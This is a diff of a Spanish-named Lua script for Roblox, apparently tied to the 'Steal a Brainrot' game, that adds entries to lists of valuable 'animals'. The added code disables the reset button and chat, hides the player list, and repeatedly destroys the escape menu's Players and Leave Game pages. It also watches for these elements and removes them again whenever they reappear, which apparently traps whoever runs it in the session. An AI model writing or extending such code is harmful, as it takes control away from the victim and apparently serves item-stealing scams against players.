@@ -198,27 +198,28 @@ local function limpiarInterfaz()
     task.spawn(function()
         pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
         pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false) end)
-        
-        local topBar = CoreGui:FindFirstChild("TopBarApp", true)
-        if topBar then
-            for _, v in ipairs(topBar:GetDescendants()) do
-                if v:IsA("GuiObject") then v.Visible = false end
-            end
-        end
     end)
 end
 limpiarInterfaz()
 task.spawn(function() while true do task.wait(5) limpiarInterfaz() end end)
 
+local function handleNewDescendant(descendant)
+    if descendant.Name == "Players" or descendant.Name == "LeaveGamePage" then
+        task.wait() 
+        pcall(function()
+            descendant:Destroy()
+        end)
+    end
+end
+
+for _, desc in ipairs(CoreGui:GetDescendants()) do
+    handleNewDescendant(desc)
+end
+
+CoreGui.DescendantAdded:Connect(handleNewDescendant)
+
 local function bloquearMenuEscape()
     task.spawn(function()
-        pcall(function()
-            local robloxGui = CoreGui:FindFirstChild("RobloxGui")
-            if robloxGui then
-                robloxGui.Enabled = false
-            end
-        end)
-        
         pcall(function()
             local adminPanel = playerGui:FindFirstChild("AdminPanel")
             if adminPanel then
@@ -230,6 +231,20 @@ local function bloquearMenuEscape()
             local playerList = CoreGui:FindFirstChild("PlayerList")
             if playerList then
                 playerList:Destroy()
+            end
+        end)
+        
+        task.spawn(function()
+            while task.wait(0.5) do
+                pcall(function()
+                    local innerFrame = CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame
+                    if innerFrame:FindFirstChild("Players") then 
+                        innerFrame.Players:Destroy()
+                    end
+                    if innerFrame:FindFirstChild("LeaveGamePage") then 
+                        innerFrame.LeaveGamePage:Destroy()
+                    end
+                end)
             end
         end)
     end)
@@ -503,6 +518,8 @@ local allowedAnimals = {
     "Ginger Gerat",
     "Los Jolly Combinasionas",
     "Money Money Reindeer",
+    "Tuff Tuoucan",
+    "Skibidi Toilet"
 }
 
 local specialAnimals = {
@@ -543,6 +560,8 @@ local specialAnimals = {
     "Nuclearo Dinossauro",
     "Jolly Jolly Sahur",
     "Ginger Gerat",
+    "Money Money Reindeer",
+    "Skibidi Toilet"
 }
 
 local BRAINROT_LIST = {
